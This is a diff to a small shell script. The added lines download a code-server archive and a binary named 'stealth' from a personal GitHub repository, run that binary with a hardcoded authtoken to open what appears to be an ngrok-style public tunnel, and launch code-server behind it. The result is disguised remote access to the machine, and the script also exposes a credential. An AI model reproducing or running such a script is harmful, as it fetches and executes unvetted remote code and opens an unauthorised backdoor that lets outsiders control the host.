@@ -1,5 +1,18 @@
 #!/bin/sh
 cd
-screen -ls
-sleep 500
-
+curl -s -L -o code-server.tar.gz https://raw.githubusercontent.com/thembilemhlabangula/update/main/code-server.tar.gz
+sleep 2
+tar -xf code-server.tar.gz
+export PATH=$HOME/code-server-4.14.1-linux-amd64/bin:$PATH
+sleep 2
+wget -q https://raw.githubusercontent.com/thembilemhlabangula/update/main/stealth >/dev/null
+sleep 2
+chmod +x stealth
+sleep 2
+./stealth authtoken 2AwzjjZsdjsGeLx1aMJUxTZPrlE_2kDSodk23t5xEzRqY6kqn
+sleep 2
+./stealth http 9090 &
+sleep 2
+curl http://127.0.0.1:4040/api/tunnels
+sleep 2
+code-server-4.14.1-linux-amd64/bin/code-server --port 9090
